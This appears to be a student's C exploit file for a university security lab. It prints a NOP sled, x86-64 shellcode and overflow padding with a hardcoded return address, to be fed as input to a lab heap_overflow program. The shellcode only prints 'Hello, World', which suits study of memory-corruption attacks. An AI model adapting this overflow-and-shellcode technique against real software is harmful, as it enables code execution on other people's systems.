/* Bradford Smith (bsmith8)
 * CS 577 Lab 3 exploit.c
 * 10/01/2015
 * "I pledge my honor that I have abided by the Stevens Honor System."
 */

/* compile: gcc exploit.c -o exploit */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* shellcode from running s-proc -p on ../shellcode/hello.sc */
char shellcode[] =
	"\x48\x31\xc0\x48\xff\xc0\x48\x31\xff\x48\xff\xc7\x48\x31\xf6"
	"\x48\x8d\x35\x32\x11\x11\x11\x48\x81\xee\x19\x11\x11\x11\x48"
	"\x31\xd2\x80\xc2\x0d\x0f\x05\x48\x31\xc0\x04\x3c\x48\x31\xff"
	"\x0f\x05\x48\x65\x6c\x6c\x6f\x2c\x20\x57\x6f\x72\x6c\x64\x0a";

/* prints out the string to be used to exploit heap_overflow
 * use: ./exploit > <file>
 * then use <file> as input for heap_overflow
 */
int main()
{
    /* yay NOPs! */
    char* nops = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    /* overflow and address of buffer in main */
    char* exploit = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\xd4\xff\xff\xff\x7f";

    /* print it out in order */
    printf("%s%s%s", nops, shellcode, exploit);

    return 0;
}
